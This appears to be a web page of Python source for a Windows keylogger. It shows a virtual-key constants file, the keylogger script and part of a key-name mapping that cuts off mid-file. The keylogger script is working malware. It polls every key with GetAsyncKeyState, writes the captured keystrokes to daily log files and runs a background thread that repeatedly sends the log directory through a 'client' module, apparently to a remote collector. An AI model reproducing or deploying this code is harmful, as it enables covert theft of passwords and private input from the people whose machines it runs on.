<h2 id="keydef-py"><a href="#keydef-py" class="headerlink" title="keydef.py"></a>keydef.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VK_LBUTTON             = <span class="number">0x01</span></span><br><span class="line">VK_RBUTTON             = <span class="number">0x02</span></span><br><span class="line">VK_CANCEL              = <span class="number">0x03</span>   <span class="comment"># Cancel</span></span><br><span class="line">VK_MBUTTON             = <span class="number">0x04</span></span><br><span class="line">VK_XBUTTON1            = <span class="number">0x05</span></span><br><span class="line">VK_XBUTTON2            = <span class="number">0x06</span></span><br><span class="line">VK_BACK                = <span class="number">0x08</span>   <span class="comment"># Backspace</span></span><br><span class="line">VK_TAB                 = <span class="number">0x09</span>   <span class="comment"># Tab</span></span><br><span class="line">VK_CLEAR               = <span class="number">0x0C</span>   <span class="comment"># Clear</span></span><br><span class="line">VK_RETURN              = <span class="number">0x0D</span>   <span class="comment"># Enter</span></span><br><span class="line">VK_SHIFT               = <span class="number">0x10</span>   <span class="comment"># Shift</span></span><br><span class="line">VK_CONTROL             = <span class="number">0x11</span>   <span class="comment"># Ctrl</span></span><br><span class="line">VK_MENU                = <span class="number">0x12</span>   <span class="comment"># Alt</span></span><br><span class="line">VK_PAUSE               = <span class="number">0x13</span>   <span class="comment"># Pause</span></span><br><span class="line">VK_CAPITAL             = <span class="number">0x14</span>   <span class="comment"># CapsLock</span></span><br><span class="line">VK_KANA                = <span class="number">0x15</span></span><br><span class="line">VK_HANGUEL             = <span class="number">0x15</span></span><br><span class="line">VK_HANGUL              = <span class="number">0x15</span></span><br><span class="line">VK_JUNJA               = <span class="number">0x17</span></span><br><span class="line">VK_FINAL               = <span class="number">0x18</span></span><br><span class="line">VK_HANJA               = <span class="number">0x19</span></span><br><span class="line">VK_KANJI               = <span class="number">0x19</span></span><br><span class="line">VK_ESCAPE              = <span class="number">0x1B</span>   <span class="comment"># Esc</span></span><br><span class="line">VK_CONVERT             = <span class="number">0x1C</span></span><br><span class="line">VK_NONCONVERT          = <span class="number">0x1D</span></span><br><span class="line">VK_ACCEPT              = <span class="number">0x1E</span></span><br><span class="line">VK_MODECHANGE          = <span class="number">0x1F</span></span><br><span class="line">VK_SPACE               = <span class="number">0x20</span>   <span class="comment"># SPACE</span></span><br><span class="line">VK_PRIOR               = <span class="number">0x21</span>   <span class="comment"># PageUp</span></span><br><span class="line">VK_NEXT                = <span class="number">0x22</span>   <span class="comment"># PageDown</span></span><br><span class="line">VK_END                 = <span class="number">0x23</span>   <span class="comment"># End</span></span><br><span class="line">VK_HOME                = <span class="number">0x24</span>   <span class="comment"># Home</span></span><br><span class="line">VK_LEFT                = <span class="number">0x25</span>   <span class="comment"># Left</span></span><br><span class="line">VK_UP                  = <span class="number">0x26</span>   <span class="comment"># Up</span></span><br><span class="line">VK_RIGHT               = <span class="number">0x27</span>   <span class="comment"># Right</span></span><br><span class="line">VK_DOWN                = <span class="number">0x28</span>   <span class="comment"># Down</span></span><br><span class="line">VK_SELECT              = <span class="number">0x29</span>   <span class="comment"># Select</span></span><br><span class="line">VK_PRINT               = <span class="number">0x2A</span>   <span class="comment"># Print</span></span><br><span class="line">VK_EXECUTE             = <span class="number">0x2B</span>   <span class="comment"># Execute</span></span><br><span class="line">VK_SNAPSHOT            = <span class="number">0x2C</span>   <span class="comment"># PrintScreen</span></span><br><span class="line">VK_INSERT              = <span class="number">0x2D</span></span><br><span class="line">VK_DELETE              = <span class="number">0x2E</span></span><br><span class="line">VK_HELP                = <span class="number">0x2F</span></span><br><span class="line">VK_0                   = <span class="number">0x30</span>   <span class="comment"># 0 [SHIFT] )</span></span><br><span class="line">VK_1                   = <span class="number">0x31</span>   <span class="comment"># 1 [SHIFT] !</span></span><br><span class="line">VK_2                   = <span class="number">0x32</span>   <span class="comment"># 2 [SHIFT] @</span></span><br><span class="line">VK_3                   = <span class="number">0x33</span>   <span class="comment"># 3 [SHIFT] #</span></span><br><span class="line">VK_4                   = <span class="number">0x34</span>   <span class="comment"># 4 [SHIFT] $</span></span><br><span class="line">VK_5                   = <span class="number">0x35</span>   <span class="comment"># 5 [SHIFT] %</span></span><br><span class="line">VK_6                   = <span class="number">0x36</span>   <span class="comment"># 6 [SHIFT] ^</span></span><br><span class="line">VK_7                   = <span class="number">0x37</span>   <span class="comment"># 7 [SHIFT] &amp;</span></span><br><span class="line">VK_8                   = <span class="number">0x38</span>   <span class="comment"># 8 [SHIFT] *</span></span><br><span class="line">VK_9                   = <span class="number">0x39</span>   <span class="comment"># 9 [SHIFT] (</span></span><br><span class="line">VK_A                   = <span class="number">0x41</span>   <span class="comment"># a [UPPER] A</span></span><br><span class="line">VK_B                   = <span class="number">0x42</span>   <span class="comment"># b [UPPER] B</span></span><br><span class="line">VK_C                   = <span class="number">0x43</span>   <span class="comment"># c [UPPER] C</span></span><br><span class="line">VK_D                   = <span class="number">0x44</span>   <span class="comment"># d [UPPER] D</span></span><br><span class="line">VK_E                   = <span class="number">0x45</span>   <span class="comment"># e [UPPER] E</span></span><br><span class="line">VK_F                   = <span class="number">0x46</span>   <span class="comment"># f [UPPER] F</span></span><br><span class="line">VK_G                   = <span class="number">0x47</span>   <span class="comment"># g [UPPER] G</span></span><br><span class="line">VK_H                   = <span class="number">0x48</span>   <span class="comment"># h [UPPER] H</span></span><br><span class="line">VK_I                   = <span class="number">0x49</span>   <span class="comment"># i [UPPER] I</span></span><br><span class="line">VK_J                   = <span class="number">0x4A</span>   <span class="comment"># j [UPPER] J</span></span><br><span class="line">VK_K                   = <span class="number">0x4B</span>   <span class="comment"># k [UPPER] K</span></span><br><span class="line">VK_L                   = <span class="number">0x4C</span>   <span class="comment"># l [UPPER] L</span></span><br><span class="line">VK_M                   = <span class="number">0x4D</span>   <span class="comment"># m [UPPER] M</span></span><br><span class="line">VK_N                   = <span class="number">0x4E</span>   <span class="comment"># n [UPPER] N</span></span><br><span class="line">VK_O                   = <span class="number">0x4F</span>   <span class="comment"># o [UPPER] O</span></span><br><span class="line">VK_P                   = <span class="number">0x50</span>   <span class="comment"># p [UPPER] P</span></span><br><span class="line">VK_Q                   = <span class="number">0x51</span>   <span class="comment"># q [UPPER] Q</span></span><br><span class="line">VK_R                   = <span class="number">0x52</span>   <span class="comment"># r [UPPER] R</span></span><br><span class="line">VK_S                   = <span class="number">0x53</span>   <span class="comment"># s [UPPER] S</span></span><br><span class="line">VK_T                   = <span class="number">0x54</span>   <span class="comment"># t [UPPER] T</span></span><br><span class="line">VK_U                   = <span class="number">0x55</span>   <span class="comment"># u [UPPER] U</span></span><br><span class="line">VK_V                   = <span class="number">0x56</span>   <span class="comment"># v [UPPER] V</span></span><br><span class="line">VK_W                   = <span class="number">0x57</span>   <span class="comment"># w [UPPER] W</span></span><br><span class="line">VK_X                   = <span class="number">0x58</span>   <span class="comment"># x [UPPER] X</span></span><br><span class="line">VK_Y                   = <span class="number">0x59</span>   <span class="comment"># y [UPPER] Y</span></span><br><span class="line">VK_Z                   = <span class="number">0x5A</span>   <span class="comment"># z [UPPER] Z</span></span><br><span class="line">VK_LWIN                = <span class="number">0x5B</span></span><br><span class="line">VK_RWIN                = <span class="number">0x5C</span></span><br><span class="line">VK_APPS                = <span class="number">0x5D</span></span><br><span class="line">VK_SLEEP               = <span class="number">0x5F</span></span><br><span class="line">VK_NUMPAD0             = <span class="number">0x60</span>   <span class="comment"># Ins [NUMLOCK] 0</span></span><br><span class="line">VK_NUMPAD1             = <span class="number">0x61</span>   <span class="comment"># End [NUMLOCK] 1</span></span><br><span class="line">VK_NUMPAD2             = <span class="number">0x62</span>   <span class="comment"># Down [NUMLOCK] 2</span></span><br><span class="line">VK_NUMPAD3             = <span class="number">0x63</span>   <span class="comment"># PageDown [NUMLOCK] 3</span></span><br><span class="line">VK_NUMPAD4             = <span class="number">0x64</span>   <span class="comment"># Left [NUMLOCK] 4</span></span><br><span class="line">VK_NUMPAD5             = <span class="number">0x65</span>   <span class="comment"># NumPad5 [NUMLOCK] 5</span></span><br><span class="line">VK_NUMPAD6             = <span class="number">0x66</span>   <span class="comment"># Right [NUMLOCK] 6</span></span><br><span class="line">VK_NUMPAD7             = <span class="number">0x67</span>   <span class="comment"># Home [NUMLOCK] 7</span></span><br><span class="line">VK_NUMPAD8             = <span class="number">0x68</span>   <span class="comment"># Up [NUMLOCK] 8</span></span><br><span class="line">VK_NUMPAD9             = <span class="number">0x69</span>   <span class="comment"># PageUp [NUMLOCK] 9</span></span><br><span class="line">VK_MULTIPLY            = <span class="number">0x6A</span>   <span class="comment"># * [NUMLOCK] *</span></span><br><span class="line">VK_ADD                 = <span class="number">0x6B</span>   <span class="comment"># + [NUMLOCK] +</span></span><br><span class="line">VK_SEPARATOR           = <span class="number">0x6C</span></span><br><span class="line">VK_SUBTRACT            = <span class="number">0x6D</span>   <span class="comment"># - [NUMLOCK] -</span></span><br><span class="line">VK_DECIMAL             = <span class="number">0x6E</span>   <span class="comment"># Del [NUMLOCK] .</span></span><br><span class="line">VK_DIVIDE              = <span class="number">0x6F</span>   <span class="comment"># / [NUMLOCK] /</span></span><br><span class="line">VK_F1                  = <span class="number">0x70</span>   <span class="comment"># F1</span></span><br><span class="line">VK_F2                  = <span class="number">0x71</span>   <span class="comment"># F2</span></span><br><span class="line">VK_F3                  = <span class="number">0x72</span>   <span class="comment"># F3</span></span><br><span class="line">VK_F4                  = <span class="number">0x73</span>   <span class="comment"># F4</span></span><br><span class="line">VK_F5                  = <span class="number">0x74</span>   <span class="comment"># F5</span></span><br><span class="line">VK_F6                  = <span class="number">0x75</span>   <span class="comment"># F6</span></span><br><span class="line">VK_F7                  = <span class="number">0x76</span>   <span class="comment"># F7</span></span><br><span class="line">VK_F8                  = <span class="number">0x77</span>   <span class="comment"># F8</span></span><br><span class="line">VK_F9                  = <span class="number">0x78</span>   <span class="comment"># F9</span></span><br><span class="line">VK_F10                 = <span class="number">0x79</span>   <span class="comment"># F10</span></span><br><span class="line">VK_F11                 = <span class="number">0x7A</span>   <span class="comment"># F11</span></span><br><span class="line">VK_F12                 = <span class="number">0x7B</span>   <span class="comment"># F12</span></span><br><span class="line">VK_F13                 = <span class="number">0x7C</span>   <span class="comment"># F13</span></span><br><span class="line">VK_F14                 = <span class="number">0x7D</span>   <span class="comment"># F14</span></span><br><span class="line">VK_F15                 = <span class="number">0x7E</span>   <span class="comment"># F15</span></span><br><span class="line">VK_F16                 = <span class="number">0x7F</span>   <span class="comment"># F16</span></span><br><span class="line">VK_F17                 = <span class="number">0x80</span>   <span class="comment"># F17</span></span><br><span class="line">VK_F18                 = <span class="number">0x81</span>   <span class="comment"># F18</span></span><br><span class="line">VK_F19                 = <span class="number">0x82</span>   <span class="comment"># F19</span></span><br><span class="line">VK_F20                 = <span class="number">0x83</span>   <span class="comment"># F20</span></span><br><span class="line">VK_F21                 = <span class="number">0x84</span>   <span class="comment"># F21</span></span><br><span class="line">VK_F22                 = <span class="number">0x85</span>   <span class="comment"># F22</span></span><br><span class="line">VK_F23                 = <span class="number">0x86</span>   <span class="comment"># F23</span></span><br><span class="line">VK_F24                 = <span class="number">0x87</span>   <span class="comment"># F24</span></span><br><span class="line">VK_NUMLOCK             = <span class="number">0x90</span>   <span class="comment"># NumLock</span></span><br><span class="line">VK_SCROLL              = <span class="number">0x91</span>   <span class="comment"># Scroll</span></span><br><span class="line">VK_LSHIFT              = <span class="number">0xA0</span></span><br><span class="line">VK_RSHIFT              = <span class="number">0xA1</span></span><br><span class="line">VK_LCONTROL            = <span class="number">0xA2</span></span><br><span class="line">VK_RCONTROL            = <span class="number">0xA3</span></span><br><span class="line">VK_LMENU               = <span class="number">0xA4</span></span><br><span class="line">VK_RMENU               = <span class="number">0xA5</span></span><br><span class="line">VK_BROWSER_BACK        = <span class="number">0xA6</span></span><br><span class="line">VK_BROWSER_FORWARD     = <span class="number">0xA7</span></span><br><span class="line">VK_BROWSER_REFRESH     = <span class="number">0xA8</span></span><br><span class="line">VK_BROWSER_STOP        = <span class="number">0xA9</span></span><br><span class="line">VK_BROWSER_SEARCH      = <span class="number">0xAA</span></span><br><span class="line">VK_BROWSER_FAVORITES   = <span class="number">0xAB</span></span><br><span class="line">VK_BROWSER_HOME        = <span class="number">0xAC</span></span><br><span class="line">VK_VOLUME_MUTE         = <span class="number">0xAD</span></span><br><span class="line">VK_VOLUME_DOWN         = <span class="number">0xAE</span></span><br><span class="line">VK_VOLUME_UP           = <span class="number">0xAF</span></span><br><span class="line">VK_MEDIA_NEXT_TRACK    = <span class="number">0xB0</span></span><br><span class="line">VK_MEDIA_PREV_TRACK    = <span class="number">0xB1</span></span><br><span class="line">VK_MEDIA_STOP          = <span class="number">0xB2</span></span><br><span class="line">VK_MEDIA_PLAY_PAUSE    = <span class="number">0xB3</span></span><br><span class="line">VK_LAUNCH_MAIL         = <span class="number">0xB4</span></span><br><span class="line">VK_LAUNCH_MEDIA_SELECT = <span class="number">0xB5</span></span><br><span class="line">VK_LAUNCH_APP1         = <span class="number">0xB6</span></span><br><span class="line">VK_LAUNCH_APP2         = <span class="number">0xB7</span></span><br><span class="line">VK_OEM_1               = <span class="number">0xBA</span>   <span class="comment"># ; [SHIFT] :</span></span><br><span class="line">VK_OEM_PLUS            = <span class="number">0xBB</span>   <span class="comment"># = [SHIFT] +</span></span><br><span class="line">VK_OEM_COMMA           = <span class="number">0xBC</span>   <span class="comment"># , [SHIFT] &lt;</span></span><br><span class="line">VK_OEM_MINUS           = <span class="number">0xBD</span>   <span class="comment"># - [SHIFT] _</span></span><br><span class="line">VK_OEM_PERIOD          = <span class="number">0xBE</span>   <span class="comment"># . [SHIFT] &gt;</span></span><br><span class="line">VK_OEM_2               = <span class="number">0xBF</span>   <span class="comment"># / [SHIFT] ?</span></span><br><span class="line">VK_OEM_3               = <span class="number">0xC0</span>   <span class="comment"># ` [SHIFT] ~</span></span><br><span class="line">VK_OEM_4               = <span class="number">0xDB</span>   <span class="comment"># [ [SHIFT] &#123;</span></span><br><span class="line">VK_OEM_5               = <span class="number">0xDC</span>   <span class="comment"># \ [SHIFT] |</span></span><br><span class="line">VK_OEM_6               = <span class="number">0xDD</span>   <span class="comment"># ] [SHIFT] &#125;</span></span><br><span class="line">VK_OEM_7               = <span class="number">0xDE</span>   <span class="comment"># &#x27; [SHIFT] &quot;</span></span><br><span class="line">VK_OEM_8               = <span class="number">0xDF</span></span><br><span class="line">VK_OEM_102             = <span class="number">0xE2</span></span><br><span class="line">VK_PROCESSKEY          = <span class="number">0xE5</span></span><br><span class="line">VK_PACKET              = <span class="number">0xE7</span></span><br><span class="line">VK_ATTN                = <span class="number">0xF6</span></span><br><span class="line">VK_CRSEL               = <span class="number">0xF7</span></span><br><span class="line">VK_EXSEL               = <span class="number">0xF8</span></span><br><span class="line">VK_EREOF               = <span class="number">0xF9</span></span><br><span class="line">VK_PLAY                = <span class="number">0xFA</span></span><br><span class="line">VK_ZOOM                = <span class="number">0xFB</span></span><br><span class="line">VK_NONAME              = <span class="number">0xFC</span></span><br><span class="line">VK_PA1                 = <span class="number">0xFD</span></span><br><span class="line">VK_OEM_CLEAR           = <span class="number">0xFE</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="keylogger-py"><a href="#keylogger-py" class="headerlink" title="keylogger.py"></a>keylogger.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">from</span> keymap <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> Output, thread_refresh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAX_KEYLOGGER_BUF = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> win32api</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keylogger</span>(<span class="params">SaveDirs=[], silentMode=<span class="literal">False</span></span>):</span></span><br><span class="line">        write         = Output(silentMode)</span><br><span class="line">        result        = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        last_update   = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            name   = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> code <span class="keyword">in</span> [VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL, VK_NUMLOCK]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                status = win32api.GetAsyncKeyState(code)</span><br><span class="line">                <span class="keyword">if</span> status &amp; <span class="number">1</span> != <span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">                CtrlKey  = win32api.GetKeyState(VK_CONTROL) &lt; <span class="number">0</span></span><br><span class="line">                AltKey   = win32api.GetKeyState(VK_MENU) &lt; <span class="number">0</span></span><br><span class="line">                ShiftKey = win32api.GetKeyState(VK_SHIFT) &lt; <span class="number">0</span></span><br><span class="line">                CapsLock = win32api.GetKeyState(VK_CAPITAL) &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">                NumLock  = win32api.GetKeyState(VK_NUMLOCK) &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">                <span class="comment"># upper    = ShiftKey != CapsLock</span></span><br><span class="line">                Modifier = []</span><br><span class="line">                <span class="keyword">if</span> CtrlKey:   Modifier.append(<span class="string">&#x27;Control&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> AltKey:    Modifier.append(<span class="string">&#x27;Alt&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> ShiftKey:  Modifier.append(<span class="string">&#x27;Shift&#x27;</span>)</span><br><span class="line">                character = keymap.get(code)</span><br><span class="line">                <span class="keyword">if</span> character <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                name = <span class="string">&#x27;-&#x27;</span>.join(Modifier + [character])</span><br><span class="line">                <span class="keyword">if</span> VK_A &lt;= code &lt;= VK_Z <span class="keyword">and</span> <span class="keyword">not</span> Modifier <span class="keyword">and</span> CapsLock:</span><br><span class="line">                    name = character.upper()</span><br><span class="line">                <span class="keyword">if</span> VK_NUMPAD0 &lt;= code &lt;= VK_DIVIDE <span class="keyword">and</span> NumLock <span class="keyword">and</span> keymap.get(<span class="string">&#x27;NumLock-&#x27;</span> + name):</span><br><span class="line">                    name = keymap.get(<span class="string">&#x27;NumLock-&#x27;</span> + name)</span><br><span class="line">                <span class="keyword">elif</span> keymap.get(name):</span><br><span class="line">                    name = keymap.get(name)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">ord</span>(name) &gt; <span class="number">255</span>:</span><br><span class="line">                    name = <span class="string">&#x27;[&#x27;</span> + name + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> code == VK_RETURN:</span><br><span class="line">                    name += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">                write(name)</span><br><span class="line">                result += name</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(result) &gt; MAX_KEYLOGGER_BUF:</span><br><span class="line">                result  = result[-MAX_KEYLOGGER_BUF:]</span><br><span class="line">            cur_time = time.time()</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">and</span> cur_time - last_update &gt; <span class="number">1</span>:</span><br><span class="line">                fileName = time.strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>) + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> SaveDir <span class="keyword">in</span> SaveDirs:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(SaveDir):</span><br><span class="line">                            os.makedirs(SaveDir)</span><br><span class="line">                        fullName = os.path.join(SaveDir, fileName)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(fullName, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                            fp.write(result)</span><br><span class="line">                        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        logging.debug(<span class="string">&#x27;Can\&#x27;t open %s&#x27;</span>, fullName)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                last_update = cur_time</span><br><span class="line">                result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keylogger</span>(<span class="params">SaveDirs=[], silentMode=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">### change parameters here ###</span></span><br><span class="line">    save_dirs       = [<span class="string">&#x27;C:\\KeyLogger&#x27;</span>]</span><br><span class="line">    update_interval = <span class="number">3</span></span><br><span class="line">    SilentMode      = <span class="literal">False</span>    <span class="comment"># no output</span></span><br><span class="line">    <span class="comment">##############################</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">        <span class="keyword">import</span> client</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">send_log</span>():</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">for</span> SaveDir <span class="keyword">in</span> save_dirs <span class="keyword">if</span> <span class="built_in">isinstance</span>(save_dirs, <span class="built_in">list</span>) <span class="keyword">else</span> [save_dirs]:</span><br><span class="line">                    client.send_dir(SaveDir)</span><br><span class="line">                time.sleep(update_interval)</span><br><span class="line">        thread = threading.Thread(target=send_log)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">    thread = threading.Thread(target=keylogger, args=(save_dirs, SilentMode))</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    <span class="keyword">while</span> threads:</span><br><span class="line">        threads = thread_refresh(threads)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="keymap-py"><a href="#keymap-py" class="headerlink" title="keymap.py"></a>keymap.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> keydef <span class="keyword">import</span> *</span><br><span class="line">keymap = &#123;</span><br><span class="line">    VK_CANCEL:           <span class="string">&#x27;Cancel&#x27;</span>,</span><br><span class="line">    VK_BACK:             <span class="string">&#x27;Backspace&#x27;</span>,</span><br><span class="line">    VK_TAB:              <span class="string">&#x27;Tab&#x27;</span>,</span><br><span class="line">    VK_CLEAR:            <span class="string">&#x27;Clear&#x27;</span>,</span><br><span class="line">    VK_RETURN:           <span class="string">&#x27;Enter&#x27;</span>,</span><br><span class="line">    VK_SHIFT:            <span class="string">&#x27;Shift&#x27;</span>,</span><br><span class="line">    VK_CONTROL:          <span class="string">&#x27;Ctrl&#x27;</span>,</span><br><span class="line">    VK_MENU:             <span class="string">&#x27;Alt&#x27;</span>,</span><br><span class="line">    VK_PAUSE:            <span class="string">&#x27;Pause&#x27;</span>,</span><br><span class="line">    VK_CAPITAL:          <span class="string">&#x27;CapsLock&#x27;</span>,</span><br><span class="line">    VK_ESCAPE:           <span class="string">&#x27;Esc&#x27;</span>,</span><br><span class="line">    VK_SPACE:            <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">    VK_PRIOR:            <span class="string">&#x27;PageUp&#x27;</span>,</span><br><span class="line">    VK_NEXT:             <span class="string">&#x27;PageDown&#x27;</span>,</span><br><span class="line">    VK_END:              <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">    VK_HOME:             <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    VK_LEFT:             <span class="string">&#x27;Left&#x27;</span>,</span><br><span class="line">    VK_UP:               <span class="string">&#x27;Up&#x27;</span>,</span><br><span class="line">    VK_RIGHT:            <span class="string">&#x27;Right&#x27;</span>,</span><br><span class="line">    VK_DOWN:             <span class="string">&#x27;Down&#x27;</span>,</span><br><span class="line">    VK_SELECT:           <span class="string">&#x27;Select&#x27;</span>,</span><br><span class="line">    VK_PRINT:            <span class="string">&#x27;Print&#x27;</span>,</span><br><span class="line">    VK_EXECUTE:          <span class="string">&#x27;Execute&#x27;</span>,</span><br><span class="line">    VK_SNAPSHOT:         <span class="string">&#x27;PrintScreen&#x27;</span>,</span><br><span class="line">    VK_0:                <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    VK_1:                <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    VK_2:                <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    VK_3:                <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    VK_4:                <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    VK_5:                <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    VK_6:                <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    VK_7:                <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    VK_8:                <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    VK_9:                <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    VK_A:                <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    VK_B:                <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    VK_C:                <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    VK_D:                <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    VK_E:                <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    VK_F:                <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    VK_G:                <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    VK_H:                <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    VK_I:                <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    VK_J:                <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    VK_K:                <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    VK_L:                <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    VK_M:                <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    VK_N:                <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    VK_O:                <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    VK_P:                <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    VK_Q:                <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    VK_R:                <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    VK_S:                <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    VK_T:                <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    VK_U:                <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    VK_V:                <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">    VK_W:                <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">    VK_X:                <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">    VK_Y:                <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    VK_Z:                <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    VK_NUMPAD0:          <span class="string">&#x27;Ins&#x27;</span>,</span><br><span class="line">    VK_NUMPAD1:          <span class="string">&#x27;End&#x27;</span>,</span><br><span class="line">    VK_NUMPAD2:          <span class="string">&#x27;Down&#x27;</span>,</span><br><span class="line">    VK_NUMPAD3:          <span class="string">&#x27;PageDown&#x27;</span>,</span><br><span class="line">    VK_NUMPAD4:          <span class="string">&#x27;Left&#x27;</span>,</span><br><span class="line">    VK_NUMPAD5:          <span class="string">&#x27;NumPad5&#x27;</span>,</span><br><span class="line">    VK_NUMPAD6:          <span class="string">&#x27;Right&#x27;</span>,</span><br><span class="line">    VK_NUMPAD7:          <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    VK_NUMPAD8:          <span class="string">&#x27;Up&#x27;</span>,</span><br><span class="line">    VK_NUMPAD9:          <span class="string">&#x27;PageUp&#x27;</span>,</span><br><span class="line">    VK_MULTIPLY:         <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    VK_ADD:              <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    VK_SUBTRACT:         <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    VK_DECIMAL:          <span class="string">&#x27;Del&#x27;</span>,</span><br><span class="line">    VK_DIVIDE:           <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    VK_F1:               <span class="string">&#x27;F1&#x27;</span>,</span><br><span class="line">    VK_F2:               <span class="string">&#x27;F2&#x27;</span>,</span><br><span class="line">    VK_F3:               <span class="string">&#x27;F3&#x27;</span>,</span><br><span class="line">    VK_F4:               <span class="string">&#x27;F4&#x27;</span>,</span><br><span class="line">    VK_F5:               <span class="string">&#x27;F5&#x27;</span>,</span><br><span class="line">    VK_F6:               <span class="string">&#x27;F6&#x27;</span>,</span><br><span class="line">    VK_F7:               <span class="string">&#x27;F7&#x27;</span>,</span><br><span class="line">    VK_F8:               <span class="string">&#x27;F8&#x27;</span>,</span><br><span 